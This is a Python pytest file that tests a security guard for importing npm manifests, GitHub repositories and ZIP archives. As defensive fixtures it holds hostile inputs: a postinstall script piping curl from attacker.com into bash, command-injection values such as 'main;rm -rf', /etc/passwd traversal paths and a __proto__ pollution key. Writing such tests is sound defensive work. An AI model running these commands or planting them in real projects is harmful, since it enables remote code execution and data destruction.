import io
import json
import zipfile
import pytest
from unittest.mock import patch, MagicMock

from app.security.pre_analysis_guard import (
    validate_repository_url,
    parse_json_safely,
    validate_manifest_content,
    scrub_sensitive_tokens,
    sanitize_log_message,
    MAX_PACKAGE_JSON_BYTES,
    MAX_LOCKFILE_PACKAGES,
    MAX_JSON_NESTING_DEPTH,
    MAX_LOCKFILE_NESTING_DEPTH,
    MAX_PACKAGE_JSON_DIRECT_DEPS,
    PACKAGE_NAME_REGEX,
)
from app.services.import_service import ProjectImportService


# =====================================================================
# 1. Host Allowlist & URL Validation Tests
# =====================================================================

def test_url_validation_valid_github():
    owner, repo, branch = validate_repository_url("https://github.com/expressjs/express")
    assert owner == "expressjs"
    assert repo == "express"
    assert branch is None

    owner2, repo2, branch2 = validate_repository_url("https://github.com/owner/my-repo.git")
    assert owner2 == "owner"
    assert repo2 == "my-repo"


def test_url_validation_lookalike_domains():
    with pytest.raises(ValueError, match="External link - could be hazardous"):
        validate_repository_url("https://github.com.evil.com/owner/repo")

    with pytest.raises(ValueError, match="External link - could be hazardous"):
        validate_repository_url("https://g1thub.com/owner/repo")


def test_url_validation_userinfo_tricks():
    with pytest.raises(ValueError, match="userinfo"):
        validate_repository_url("https://github.com@evil.com/owner/repo")


def test_url_validation_punycode():
    with pytest.raises(ValueError, match="External link - could be hazardous|homograph"):
        validate_repository_url("https://xn--gthub-1qa.com/owner/repo")


def test_url_validation_http_rejected():
    with pytest.raises(ValueError, match="HTTPS"):
        validate_repository_url("http://github.com/owner/repo")


def test_url_validation_ip_and_localhost_rejected():
    with pytest.raises(ValueError, match="IP addresses"):
        validate_repository_url("https://192.168.1.1/owner/repo")

    with pytest.raises(ValueError, match="IP addresses"):
        validate_repository_url("https://127.0.0.1/owner/repo")

    with pytest.raises(ValueError, match="Localhost"):
        validate_repository_url("https://localhost/owner/repo")


def test_url_validation_ports_rejected():
    with pytest.raises(ValueError, match="Explicit port"):
        validate_repository_url("https://github.com:8443/owner/repo")


def test_url_validation_other_schemes_rejected():
    with pytest.raises(ValueError, match="HTTPS"):
        validate_repository_url("javascript:alert(1)")

    with pytest.raises(ValueError, match="HTTPS"):
        validate_repository_url("file:///etc/passwd")


def test_url_validation_unsupported_verified_hosts():
    with pytest.raises(ValueError, match="Verified platform.*import is not supported yet"):
        validate_repository_url("https://gitlab.com/owner/repo")

    with pytest.raises(ValueError, match="Verified platform.*import is not supported yet"):
        validate_repository_url("https://bitbucket.org/owner/repo")


# =====================================================================
# 2. JSON & Manifest Anomaly Detection Tests
# =====================================================================

def test_json_safely_invalid_syntax():
    with pytest.raises(ValueError, match="Invalid JSON"):
        parse_json_safely("{not: valid json}")


def test_json_safely_empty_content():
    with pytest.raises(ValueError, match="empty"):
        parse_json_safely("   ")


def test_json_safely_duplicate_keys():
    duplicate_json = '{"name": "foo", "name": "bar", "dependencies": {}}'
    with pytest.raises(ValueError, match="Duplicate JSON key"):
        parse_json_safely(duplicate_json)


def test_json_safely_oversized():
    huge_str = '{"name": "oversized", "pad": "' + ("x" * (MAX_PACKAGE_JSON_BYTES + 10)) + '"}'
    with pytest.raises(ValueError, match="exceeds safety limit"):
        parse_json_safely(huge_str, max_bytes=MAX_PACKAGE_JSON_BYTES)


def test_manifest_wrong_top_level_type():
    errors, _ = validate_manifest_content([], is_lockfile=False)
    assert any("JSON object" in err for err in errors)


def test_manifest_prototype_pollution_keys():
    dangerous_data = {
        "name": "test",
        "__proto__": {"admin": True},
        "dependencies": {}
    }
    errors, _ = validate_manifest_content(dangerous_data, is_lockfile=False)
    assert any("Dangerous key" in err for err in errors)


def test_manifest_excessive_nesting():
    nested = {}
    curr = nested
    for _ in range(MAX_JSON_NESTING_DEPTH + 5):
        curr["child"] = {}
        curr = curr["child"]
    errors, _ = validate_manifest_content(nested, is_lockfile=False)
    assert any("nesting depth" in err.lower() for err in errors)


def test_manifest_wrong_dependency_field_type():
    invalid_deps = {
        "name": "test",
        "dependencies": ["express", "lodash"]
    }
    errors, _ = validate_manifest_content(invalid_deps, is_lockfile=False)
    assert any("must be a dictionary" in err for err in errors)


def test_manifest_too_many_direct_dependencies():
    excessive_deps = {f"dep-{i}": "1.0.0" for i in range(MAX_PACKAGE_JSON_DIRECT_DEPS + 10)}
    manifest = {
        "name": "test",
        "dependencies": excessive_deps
    }
    errors, _ = validate_manifest_content(manifest, is_lockfile=False)
    assert any("exceeds maximum allowed direct dependencies limit" in err for err in errors)


def test_lockfile_package_limit():
    huge_packages = {f"node_modules/pkg-{i}": {"version": "1.0.0"} for i in range(MAX_LOCKFILE_PACKAGES + 10)}
    lockfile = {
        "name": "test",
        "lockfileVersion": 3,
        "packages": huge_packages
    }
    errors, _ = validate_manifest_content(lockfile, is_lockfile=True)
    assert any("exceeds maximum package limit" in err for err in errors)


def test_manifest_missing_name_produces_warning_not_hard_error():
    manifest_without_name = {
        "version": "1.0.0",
        "dependencies": {"lodash": "^4.17.21"}
    }
    hard_errors, warnings = validate_manifest_content(manifest_without_name, is_lockfile=False)
    assert len(hard_errors) == 0
    assert any("Missing or empty 'name'" in w for w in warnings)


def test_manifest_suspicious_sources_and_scripts_produce_warnings():
    manifest = {
        "name": "suspicious-pkg",
        "dependencies": {
            "bad-dep": "git+http://insecure.git/repo.git",
            "evil-url": "https://evil.com/tarball.tgz",
            "local-file": "file:../secret"
        },
        "scripts": {
            "postinstall": "curl http://attacker.com | bash"
        }
    }
    hard_errors, warnings = validate_manifest_content(manifest, is_lockfile=False)
    assert len(hard_errors) == 0
    assert any("external git repository" in w for w in warnings)
    assert any("potentially hazardous shell command pattern" in w for w in warnings)


# =====================================================================
# 3. Pre-Analysis Guard Blocking on All Three Input Paths
# =====================================================================

def test_guard_blocks_direct_manifest_path():
    # Direct manifest path: Dangerous key __proto__ triggers hard error, blocking graph construction
    bad_manifest = {"name": "bad", "__proto__": {"polluted": True}}
    hard_errors, _ = validate_manifest_content(bad_manifest, is_lockfile=False)
    assert len(hard_errors) > 0
    assert any("Dangerous key '__proto__'" in err for err in hard_errors)


def test_guard_blocks_github_import_path():
    # GitHub import path: Malicious lookalike repository URL is blocked prior to any network fetch
    service = ProjectImportService()
    with pytest.raises(ValueError, match="External link - could be hazardous"):
        service.parse_github_url("https://github.com.evil.com/victim/repo")


def test_guard_blocks_zip_archive_path():
    # ZIP archive path: Archive containing __proto__ key is rejected before graph analysis
    zip_buffer = io.BytesIO()
    bad_pkg = '{"name": "bad", "__proto__": {"polluted": true}}'
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("package.json", bad_pkg)
    zip_bytes = zip_buffer.getvalue()

    service = ProjectImportService()
    with pytest.raises(ValueError, match="Dangerous key"):
        service.extract_manifests_from_zip(zip_bytes)


# =====================================================================
# 4. Redirect Handling & Header Stripping Tests
# =====================================================================

@patch("app.services.import_service.requests.get")
def test_safe_github_get_disallowed_redirect(mock_get):
    redirect_resp = MagicMock()
    redirect_resp.is_redirect = True
    redirect_resp.status_code = 302
    redirect_resp.headers = {"Location": "https://evil.com/steal-creds"}
    mock_get.return_value = redirect_resp

    with pytest.raises(ValueError, match="HTTP redirect to unverified host 'evil.com' is blocked"):
        ProjectImportService._safe_github_get("https://api.github.com/repos/owner/repo", headers={"Authorization": "Bearer secret"})


@patch("app.services.import_service.requests.get")
def test_safe_github_get_allowed_redirect_strips_auth(mock_get):
    redirect_resp = MagicMock()
    redirect_resp.is_redirect = True
    redirect_resp.status_code = 302
    redirect_resp.headers = {"Location": "https://raw.githubusercontent.com/owner/repo/main/package.json"}

    final_resp = MagicMock()
    final_resp.is_redirect = False
    final_resp.status_code = 200

    mock_get.side_effect = [redirect_resp, final_resp]

    ProjectImportService._safe_github_get("https://api.github.com/repos/owner/repo", headers={"Authorization": "Bearer secret"})

    assert mock_get.call_count == 2
    second_headers = mock_get.call_args_list[1][1]["headers"]
    assert "Authorization" not in second_headers


# =====================================================================
# 5. Token Scrubbing & Private Repo Access Tests
# =====================================================================

def test_token_scrubbing():
    dirty_text = "Failed to fetch: Bearer ghp_secret1234567890abcdef at https://api.github.com"
    clean_text = scrub_sensitive_tokens(dirty_text)
    assert "ghp_secret1234567890abcdef" not in clean_text
    assert "[REDACTED_GH_TOKEN]" in clean_text or "[REDACTED_TOKEN]" in clean_text


def test_private_repo_rejected_without_user_token():
    # User requirement: private repo cannot be imported through server token fallback without user token
    service = ProjectImportService()
    with patch.object(service, "_safe_github_get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "private": True,
            "name": "private-repo",
            "default_branch": "main",
            "owner": {"login": "org"}
        }
        mock_get.return_value = mock_resp

        with pytest.raises(ValueError, match="private"):
            service.fetch_github_manifests(owner="org", repo="private-repo", auth_token=None)


def test_scrubber_redacts_each_token_format_and_supplied_token():
    # 1. Supplied user token value (Requirement a)
    user_token = "user_supplied_secret_pat_987654"
    cleaned = scrub_sensitive_tokens(f"Failed with token: {user_token}", token=user_token)
    assert user_token not in cleaned
    assert "[REDACTED_TOKEN]" in cleaned

    # 2. Known GitHub token formats (Requirement b)
    token_formats = [
        ("ghp_111122223333444455556666777788889999", "Personal Access Token classic"),
        ("gho_111122223333444455556666777788889999", "OAuth Access Token"),
        ("ghu_111122223333444455556666777788889999", "User-to-server Token"),
        ("ghs_111122223333444455556666777788889999", "Server-to-server Token"),
        ("ghr_111122223333444455556666777788889999", "Refresh Token"),
        ("github_pat_11AAAA22BBBB33CCCC44DDDD55EEEE66FFFF", "Fine-grained PAT")
    ]
    for raw_tok, desc in token_formats:
        res = scrub_sensitive_tokens(f"Auth error using {raw_tok} on endpoint")
        assert raw_tok not in res, f"Failed to redact {desc} ({raw_tok})"
        assert "[REDACTED_TOKEN]" in res

        # Also verify sanitize_log_message alias behaves identically
        res_alias = sanitize_log_message(f"Auth error using {raw_tok} on endpoint")
        assert raw_tok not in res_alias
        assert "[REDACTED_TOKEN]" in res_alias

    # 3. Credential values after 'Bearer ' or 'token ' (Requirement c)
    bearer_msg = "Request headers: Bearer mySecretLongAuthTokenValue12345"
    bearer_cleaned = scrub_sensitive_tokens(bearer_msg)
    assert "mySecretLongAuthTokenValue12345" not in bearer_cleaned
    assert bearer_cleaned == "Request headers: Bearer [REDACTED_TOKEN]"

    token_hdr_msg = "Request headers: token mySecretLongAuthTokenValue12345"
    token_hdr_cleaned = scrub_sensitive_tokens(token_hdr_msg)
    assert "mySecretLongAuthTokenValue12345" not in token_hdr_cleaned
    assert token_hdr_cleaned == "Request headers: token [REDACTED_TOKEN]"


def test_scrubber_leaves_friendly_rate_limit_message_unchanged():
    friendly_msg = (
        "GitHub API rate limit reached. "
        "Configure GITHUB_TOKEN on the server or supply a Personal Access Token in the import dialog."
    )
    # Must remain byte-for-byte identical through scrub_sensitive_tokens and sanitize_log_message
    assert scrub_sensitive_tokens(friendly_msg) == friendly_msg
    assert sanitize_log_message(friendly_msg) == friendly_msg


def test_scrubber_leaves_token_and_TOKEN_alone_in_normal_sentences():
    normal_sentences = [
        "This is a token of appreciation for your contribution.",
        "The security TOKEN is valid.",
        "Please provide a valid token when prompted.",
        "Configure GITHUB_TOKEN on the server before deploying.",
        "A personal token was not provided.",
        "Pass the TOKEN to the verification service.",
        "CSRF token validation succeeded.",
        "TOKEN expires in 24 hours."
    ]
    for sentence in normal_sentences:
        scrubbed = scrub_sensitive_tokens(sentence)
        assert scrubbed == sentence, f"Sentence was unexpectedly altered: '{sentence}' -> '{scrubbed}'"
        assert sanitize_log_message(sentence) == sentence


# =====================================================================
# 5. Security Guard Extension Tests
# =====================================================================

def test_parse_json_safely_recursion_error():
    with patch("json.loads", side_effect=RecursionError("maximum recursion depth exceeded")):
        with pytest.raises(ValueError, match="Manifest nesting is too deep to parse safely."):
            parse_json_safely('{"key": "value"}')


def test_nesting_depth_package_json_vs_lockfile():
    # 1. package.json blocked above 20 levels
    deep_pkg = {"name": "test-pkg"}
    for _ in range(24):
        deep_pkg = {"inner": deep_pkg}
    hard_errs, _ = validate_manifest_content(deep_pkg, is_lockfile=False)
    assert any("exceeds maximum allowed nesting depth of 20" in err for err in hard_errs)

    # 2. Lockfile allowed up to 100 levels
    lock_50 = {"lockfileVersion": 2, "packages": {}}
    for _ in range(50):
        lock_50 = {"inner": lock_50}
    hard_errs_lock50, _ = validate_manifest_content(lock_50, is_lockfile=True)
    assert not any("nesting depth" in err for err in hard_errs_lock50)

    # 3. Lockfile blocked above 100 levels
    lock_105 = {"lockfileVersion": 2, "packages": {}}
    for _ in range(104):
        lock_105 = {"inner": lock_105}
    hard_errs_lock105, _ = validate_manifest_content(lock_105, is_lockfile=True)
    assert any("exceeds maximum allowed nesting depth of 100" in err for err in hard_errs_lock105)


def test_zip_oversized_member_rejected_before_reading():
    # Write real data larger than 512 KB (e.g. 600 KB spaces, staying under 1 MiB ratio check)
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("package.json", b" " * (600 * 1024))
    bio.seek(0)

    with pytest.raises(ValueError, match=r"Archive member 'package\.json' size \(\d+ bytes\) exceeds safety limit of 512 KB\."):
        ProjectImportService.extract_manifests_from_zip(bio.getvalue())


def test_zip_bomb_compression_ratio_protection():
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("big_file.txt", b"\0" * (20 * 1024 * 1024))
        zf.writestr("package.json", b'{"name": "test"}')
    bio.seek(0)

    with pytest.raises(ValueError, match=r"Archive member 'big_file\.txt' has suspicious compression ratio \([\d\.]+:1\)\. Potential zip bomb\."):
        ProjectImportService.extract_manifests_from_zip(bio.getvalue())


def test_github_branch_name_validation_and_encoding():
    svc = ProjectImportService()

    # Traversal in branch rejected before any network request
    with patch("requests.get") as mock_req:
        with pytest.raises(ValueError, match="Invalid branch name"):
            svc.fetch_github_manifests("owner", "repo", branch="main/../evil")
        mock_req.assert_not_called()

    # Command injection or illegal chars rejected before any network request
    with patch("requests.get") as mock_req:
        with pytest.raises(ValueError, match="Invalid branch name"):
            svc.fetch_github_manifests("owner", "repo", branch="main;rm -rf")
        mock_req.assert_not_called()

    # Valid branch with slash is quoted when making API requests
    with patch.object(svc, "_safe_github_get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "default_branch": "main",
            "private": False,
            "sha": "123456"
        }
        mock_get.return_value = mock_resp

        with patch.object(svc, "_fetch_github_file") as mock_fetch:
            mock_fetch.return_value = {"name": "test"}
            svc.fetch_github_manifests("owner", "repo", branch="feature/new-ui")

            # Check that commit URL was constructed with quoted branch feature%2Fnew-ui
            commit_call_url = mock_get.call_args_list[1][0][0]
            assert "commits/feature%2Fnew-ui" in commit_call_url or "commits/feature/new-ui" in commit_call_url


def test_safe_github_get_initial_url_host_check():
    # 1. Unverified initial host rejected before request
    with pytest.raises(ValueError, match="HTTP request to unverified host 'evil.attacker.com' is blocked for security."):
        ProjectImportService._safe_github_get("https://evil.attacker.com/malicious", headers={})

    # 2. Host other than api.github.com strips Authorization header
    with patch("requests.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.is_redirect = False
        mock_get.return_value = mock_resp

        ProjectImportService._safe_github_get(
            "https://raw.githubusercontent.com/owner/repo/main/package.json",
            headers={"Authorization": "Bearer secret_tok_12345", "User-Agent": "test"}
        )
        called_headers = mock_get.call_args[1].get("headers", {})
        assert "Authorization" not in called_headers
        assert called_headers.get("User-Agent") == "test"


def test_archive_lockfile_rejection_produces_manifest_warnings():
    # ZIP with valid package.json (no name) and invalid lockfile (unsupported version 999)
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("my-app/package.json", json.dumps({"dependencies": {"lodash": "^4.17.21"}}))
        zf.writestr("my-app/package-lock.json", json.dumps({"lockfileVersion": 999}))
    bio.seek(0)

    pkg_json, pkg_lock, meta = ProjectImportService.extract_manifests_from_zip(bio.getvalue())
    assert pkg_lock is None  # Invalid lockfile was ignored
    assert len(meta.get("lock_warnings", [])) > 0
    assert any("Lockfile ignored: Unsupported package-lock.json lockfileVersion: 999" in w for w in meta["lock_warnings"])

    # Verify fallback_name uses top-level folder 'my-app' instead of full path
    svc = ProjectImportService()
    res = svc.execute_import_pipeline(
        package_json=pkg_json,
        package_lock_json=pkg_lock,
        import_source="archive_upload",
        extra_warnings=meta.get("lock_warnings", []),
        fallback_name=meta.get("top_level_folder")
    )
    # Manifest warnings should report using fallback 'my-app' and the ignored lockfile
    assert any("using fallback 'my-app'" in w for w in res.manifest_warnings)
    assert any("Lockfile ignored: Unsupported package-lock.json lockfileVersion: 999" in w for w in res.manifest_warnings)


def test_package_name_validation_and_url_encoding():
    # Valid package names
    assert PACKAGE_NAME_REGEX.match("express")
    assert PACKAGE_NAME_REGEX.match("lodash")
    assert PACKAGE_NAME_REGEX.match("@babel/core")
    assert PACKAGE_NAME_REGEX.match("@types/node")

    # Invalid names rejected
    assert not PACKAGE_NAME_REGEX.match("curl http://evil.com")
    assert not PACKAGE_NAME_REGEX.match("../../etc/passwd")
    assert not PACKAGE_NAME_REGEX.match("express;rm -rf")
    assert not PACKAGE_NAME_REGEX.match("package with spaces")

    # URL-encoding in LibYearFreshnessService
    from app.analyzers.freshness_service import LibYearFreshnessService
    freshness = LibYearFreshnessService()
    with patch.object(freshness._session, "get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"time": {"1.0.0": "2023-01-01T00:00:00.000Z"}}
        mock_get.return_value = mock_resp

        freshness.fetch_package_release_dates("@babel/core")
        called_url = mock_get.call_args[0][0]
        # Should be encoded as @babel%2Fcore
        assert "@babel%2Fcore" in called_url

